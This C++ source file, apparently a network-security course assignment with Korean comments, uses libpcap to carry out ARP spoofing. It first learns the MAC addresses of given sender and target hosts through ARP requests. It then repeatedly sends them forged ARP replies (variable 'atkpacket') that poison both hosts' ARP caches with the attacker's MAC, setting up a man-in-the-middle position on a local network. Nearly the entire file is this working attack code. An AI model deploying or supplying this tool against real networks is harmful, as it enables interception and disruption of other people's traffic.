#include <cstdio>
#include <pcap.h>
#include <string>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)



void usage();
void getMacAddress(char* ifaceName, char* macAddressStr);
void getIPAddress(char* ifaceName, char* ipAddressStr);
EthArpPacket MakeArpPacket(char arp_type, Mac dmac, Mac smac, Mac arp_smac, Ip sip, Mac tmac, Ip tip);
EthArpPacket* checkArpPacket(const u_char* packet, const pcap_pkthdr* header);
void sendArpPacket(EthArpPacket arp_pkt, pcap_t* handle);
void printArpInfo(EthArpPacket pkt);


int main(int argc, char* argv[]) {
	//printf("start main");
	if (argc < 3) {
		usage();
		return 1;
	}

	// interface name
	char* ifname = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", ifname, errbuf);
		return -1;
	}
	
	char my_mac_addr[18];
	char my_ip_addr[20];
	getMacAddress(ifname, my_mac_addr);
	getIPAddress(ifname, my_ip_addr);


	// arp request pkt
	EthArpPacket arpRequestPkt;

	struct pcap_pkthdr* header;
	const u_char* packet;

	// 보낼 arp 요청 개수 (전체 인자 - 2)
	int pkt_Num = argc - 2;
	
	// sender의 arp 응답 인덱스: 0, 2, 4, ...
	// target의 arp 응답 인덱스: 1, 3, 5, ...
	EthArpPacket* arpReplyPkt = new EthArpPacket[pkt_Num];

	int count = 0;

	// send arp request to sender
	for (int i = 2; i < argc; i += 2) {
		// MakeArpPacket: arp_type, dmac, smac, arp_smac, sip, tmac, tip
		// arp request to sender
		arpRequestPkt = MakeArpPacket('q',
			Mac("FF:FF:FF:FF:FF:FF"),
			Mac(my_mac_addr),
			Mac(my_mac_addr),
			Ip(my_ip_addr),
			Mac("00:00:00:00:00:00"),
			Ip(argv[i])
		);

		sendArpPacket(arpRequestPkt, handle);

		EthArpPacket* capture;
		int ret;
		while (true) {
			ret = pcap_next_ex(handle, &header, &packet);
			if (ret == 1) {
				capture = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
			}
			else
				continue;

			if ( (ntohs(capture->eth_.type_) == 0x0806) && (ntohs(capture->arp_.op_) == ArpHdr::Reply) ) {
				arpReplyPkt[count] = *capture;
				printf("count: %d\n", count);
				printArpInfo(arpReplyPkt[count]);
				count++;
				break;
			}

		}


		// MakeArpPacket: arp_type, dmac, smac, arp_smac, sip, tmac, tip
		// arp request to target
		arpRequestPkt = MakeArpPacket('q',
			Mac("FF:FF:FF:FF:FF:FF"),
			Mac(my_mac_addr),
			Mac(my_mac_addr),
			Ip(my_ip_addr),
			Mac("00:00:00:00:00:00"),
			Ip(argv[i + 1])
		);

		sendArpPacket(arpRequestPkt, handle);
		while (true) {
			ret = pcap_next_ex(handle, &header, &packet);
			if (ret == 1) {
				capture = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
			}
			else
				continue;

			if (ntohs(capture->eth_.type_) == 0x0806 && ntohs(capture->arp_.op_) == ArpHdr::Reply) {
				arpReplyPkt[count] = *capture;
				printf("count: %d\n", count);
				printArpInfo(arpReplyPkt[count]);
				count++;
				break;
			}

		}

		puts("check again arpreplypkt [0]");
		printf("count: %d\n", count - i);
		printArpInfo(arpReplyPkt[count-i]);

		puts("check again arpreplypkt [1]");
		printf("count: %d\n", count - i + 1);
		printArpInfo(arpReplyPkt[count - i + 1]);
		
	}

	EthArpPacket atkpacket;

	// arp spoof sender
	for (int k = 0; k < 10; k++) {

		for (int i = 2; i < argc; i += 2) {

			printf("i: %d\n", i);
			printf("sender: %s\n", argv[i]);
			printf("target: %s\n", argv[i + 1]);

			// MakeArpPacket: arp_type, dmac, smac, arp_smac, sip, tmac, tip
			// arp reply to sender (looks like target -> sender)
			puts("arp reply to sender");
			printf("tmac: %s\n", std::string(arpReplyPkt[i - 2].eth_.smac_).c_str());
			printf("smac: %s\n", my_mac_addr);

			atkpacket = MakeArpPacket('p',
				arpReplyPkt[i - 2].eth_.smac_, // dmac: sender mac
				Mac(my_mac_addr),
				Mac(my_mac_addr),
				Ip(argv[i + 1]), // sip: target ip
				arpReplyPkt[i - 2].eth_.smac_, // tmac: sender mac
				Ip(argv[i]) // tip: sender ip
			);

			sendArpPacket(atkpacket, handle);

			// MakeArpPacket: arp_type, dmac, smac, arp_smac, sip, tmac, tip
			// send arp reply to target (looks like sender -> target)
			puts("arp reply to target");
			printf("tmac: %s\n", std::string(arpReplyPkt[i - 1].eth_.smac_).c_str());
			printf("smac: %s\n", my_mac_addr);
			atkpacket = MakeArpPacket('p',
				arpReplyPkt[i - 1].eth_.smac_, // dmac: target mac
				Mac(my_mac_addr),
				Mac(my_mac_addr),
				Ip(argv[i]), // sip: sender
				arpReplyPkt[i - 1].eth_.smac_, // tbac: target mac
				Ip(argv[i + 1]) // tip: target
			);

			sendArpPacket(atkpacket, handle);

		}
	}
	
	delete[] arpReplyPkt;
	pcap_close(handle);

}


void usage() {
	printf("syntax: send-arp-test <interface> <sender-ip> <target-ip>\n");
	printf("sample: send-arp-test wlan0 192.168.0.31 192.168.0.1\n");
}

void getMacAddress(char* ifaceName, char* macAddressStr) {
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1) {
		perror("Error opening socket");
		exit(EXIT_FAILURE);
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);


	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
		perror("Error getting MAC address");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	close(sockfd);

	unsigned char* macAddress = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	sprintf(macAddressStr, "%02X:%02X:%02X:%02X:%02X:%02X",
		macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);


}


void getIPAddress(char* ifaceName, char* ipAddressStr) {
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1) {
		perror("Error opening socket");
		exit(EXIT_FAILURE);
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);

	if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
		perror("Error getting IP address");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	close(sockfd);

	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
	const char* ipAddress = inet_ntop(AF_INET, &ipaddr->sin_addr, ipAddressStr, INET_ADDRSTRLEN);
	if (ipAddress == NULL) {
		perror("Error converting IP address");
		exit(EXIT_FAILURE);
	}

	//printf("%s\n", ipAddress);
	strcpy(ipAddressStr, ipAddress);

}

EthArpPacket MakeArpPacket(char arp_type, Mac dmac, Mac smac, Mac arp_smac, Ip sip, Mac tmac, Ip tip) {

	EthArpPacket res;
	// dst mac: broadcast
	res.eth_.dmac_ = dmac;

	// src mac: my mac
	res.eth_.smac_ = smac;

	// type: arp
	res.eth_.type_ = htons(EthHdr::Arp);

	// arp datagram
	res.arp_.hrd_ = htons(ArpHdr::ETHER);
	res.arp_.pro_ = htons(EthHdr::Ip4);
	res.arp_.hln_ = Mac::SIZE;
	res.arp_.pln_ = Ip::SIZE;

	switch (arp_type) {
	case 'q':
		res.arp_.op_ = htons(ArpHdr::Request);
		break;
	case 'p':
		res.arp_.op_ = htons(ArpHdr::Reply);
		break;
	default:
		res.arp_.op_ = htons(ArpHdr::Request);
		break;
	}

	res.arp_.smac_ = arp_smac; // source mac (self)
	res.arp_.sip_ = htonl(sip); // source ip (self)
	res.arp_.tmac_ = tmac; // target mac (00:)
	res.arp_.tip_ = htonl(tip); // sender ip

	return res;

}

// arp 응답일 경우 리턴
EthArpPacket* checkArpPacket(const u_char* packet, const pcap_pkthdr* header) {
	EthArpPacket* arpPacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
	printf("captured packet\n");
	printf("dst MAC: %s\n", std::string(arpPacket->eth_.dmac_).c_str());
	printf("src mac: %s\n", std::string(arpPacket->eth_.smac_).c_str());
	printf("ether type: %04X\n", ntohs(arpPacket->eth_.type_));


	// ARP 응답인지 확인
	if (ntohs(arpPacket->eth_.type_) == EthHdr::Arp && ntohs(arpPacket->arp_.op_) == ArpHdr::Reply) {
		printf("Received ARP Reply:\n");
		printf("Sender MAC: %s\n", std::string(arpPacket->arp_.smac_).c_str());
		printf("Sender IP: %s\n", std::string(arpPacket->arp_.sip_).c_str());
		printf("Target MAC: %s\n", std::string(arpPacket->arp_.tmac_).c_str());
		printf("Target IP: %s\n", std::string(arpPacket->arp_.tip_).c_str());
		return arpPacket;

		// 예시: ARP 응답 정보 출력

	}
	else {
		puts("not a arp reply");
		return NULL;
	}
}

void sendArpPacket(EthArpPacket arp_pkt, pcap_t* handle) {

	struct pcap_pkthdr* header;
	const u_char* packet;

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_pkt), sizeof(EthArpPacket));
	puts("send arp packet");
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

}

void printArpInfo(EthArpPacket pkt) {

	puts("Arp Packet Info");
	printf("dmac: %04x\n", ntohs(pkt.arp_.op_));
	printf("dmac: %s\n", std::string(pkt.eth_.dmac_).c_str());
	printf("smac: %s\n", std::string(pkt.eth_.smac_).c_str());
	printf("arp_smac: %s\n", std::string(pkt.arp_.smac_).c_str());
	printf("sip: %s\n", std::string(pkt.arp_.sip_).c_str());
	printf("tmac: %s\n", std::string(pkt.arp_.tmac_).c_str());
	printf("tip: %s\n\n", std::string(pkt.arp_.tip_).c_str());

}
